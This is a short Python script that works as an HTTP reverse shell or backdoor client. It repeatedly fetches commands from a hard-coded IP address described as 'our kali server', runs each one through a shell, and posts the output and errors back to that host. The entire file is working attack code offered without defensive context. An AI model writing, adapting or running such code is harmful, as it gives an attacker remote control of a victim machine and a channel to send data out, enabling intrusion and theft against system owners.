

import requests # pip install requests
import subprocess 
import time


while True: 

    req = requests.get('http://111.111.11.11') # Send GET request to our kali server
    command = req.text # Store the received txt into command variable
        
    if 'terminate' in command:
        break 

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://111.111.11.11', data=CMD.stdout.read() ) # POST the result 
        post_response = requests.post(url='http://111.111.11.11', data=CMD.stderr.read() ) # or the error -if any-

    time.sleep(3)